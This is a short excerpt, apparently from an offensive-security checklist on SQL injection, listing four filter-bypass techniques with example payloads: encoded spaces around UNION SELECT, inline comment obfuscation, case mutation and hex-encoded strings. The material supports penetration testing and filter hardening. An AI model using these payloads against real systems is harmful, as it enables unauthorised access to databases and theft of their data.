...
- Source: https://github.com/sahar042/offensive-checklist/blob/main/sql-injection.md


## Advanced Bypass Techniques & Payloads

- **Space Evasion**: `id=1%09UNION%09SELECT` or `id=1/**/UNION/**/SELECT`
- **Comment Obfuscation**: `SELECT/*FOO*/1/*BAR*/FROM/*BAZ*/users`
- **Case Mutation**: `uNIoN SeLecT`
- **Hex Encoding**: `SELECT 0x50617373776f7264`
